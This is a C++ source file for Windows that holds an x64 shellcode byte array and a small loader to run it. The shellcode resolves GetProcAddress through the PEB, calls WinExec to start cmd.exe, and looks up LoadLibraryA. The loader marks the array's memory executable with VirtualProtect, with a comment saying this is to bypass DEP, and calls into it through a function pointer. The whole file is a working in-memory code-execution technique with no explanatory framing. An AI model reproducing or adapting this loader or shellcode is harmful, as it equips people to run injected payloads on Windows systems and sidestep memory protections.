#include <stdio.h>
#include <iostream>
#include <stdint.h>
#include "Windows.h"

using namespace std;

int main(char argc, char** argv) {
	
	uint8_t shellcode[] =
		"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B\x58\x20"
		"\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2\x48\x01\xDA\x48\x31\xC9\xB1\x88\x48\x01\xD1\x44\x8B\x01\x49\x01\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
		"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48\x01\xDA\x48\x89\xD7"
		"\x57\x53\x48\xB9\xFF\x57\x69\x6E\x45\x78\x65\x63\x48\xC1\xE9\x08\x51\x48\x89\xD9\x48\x89\xE2\x48\x83\xEC\x30\xFF\xD7\x48\x83\xC4\x30\x48\x83\xC4\x08\x48\x89\xC6\x5B\x5F"
		"\x56\x57\x53\x48\xB9\xFF\xFF\xFF\xFF\xFF\x65\x78\x65\x48\xC1\xE9\x28\x51\x48\xB9\x6D\x33\x32\x5C\x63\x6D\x64\x2E\x51\x48\xB9\x77\x73\x5C\x53\x79\x73\x74\x65\x51\x48\xB9\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x51\x48\x89\xE1\x48\x31\xD2\x48\x83\xEC\x30\xFF\xD6\x48\x83\xC4\x30\x48\x83\xC4\x20\x5B\x5F\x5E"
		"\x56\x57\x53\xB9\x61\x72\x79\x41\x51\x48\xB9\x4C\x6F\x61\x64\x4C\x69\x62\x72\x51\x48\x89\xD9\x48\x89\xE2\x48\x83\xEC\x30\xFF\xD7\x48\x83\xC4\x30\x48\x83\xC4\x10\x49\x89\xC1\x5B\x5F\x5E\xC3";

	//SET Virtual Page with shellcode is RWE (for DEP)
	DWORD old = 0;
	VirtualProtect(shellcode, strlen((const char*)shellcode), PAGE_EXECUTE_READWRITE, &old);

	//CREATE Function proc_shellcode for call shellcode
	int (*proc_shellcode)() = (int(*)())((uint8_t*)shellcode);
	proc_shellcode();

	return 0;
}